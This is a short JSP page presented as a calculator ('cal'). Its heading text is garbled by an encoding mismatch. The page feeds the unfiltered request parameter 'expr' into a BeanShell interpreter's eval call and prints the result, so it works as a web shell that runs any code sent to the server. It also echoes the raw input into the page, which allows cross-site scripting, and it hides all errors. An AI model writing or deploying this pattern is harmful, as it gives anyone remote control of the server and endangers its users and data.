<%@ page contentType="text/html; charset=GBK" import="bsh.*" %>
<html>
<head><title>cal</title>
</head>  
<body bgcolor="#ffffff">
<h1>������</h1>
<%

try{
  Interpreter bsh=new Interpreter();
  bsh.eval("el="+request.getParameter("expr"));
  out.println(request.getParameter("expr")+"=");
  out.println(bsh.get("el"));
  }catch(Exception e){}
 %>
</body>
</html>
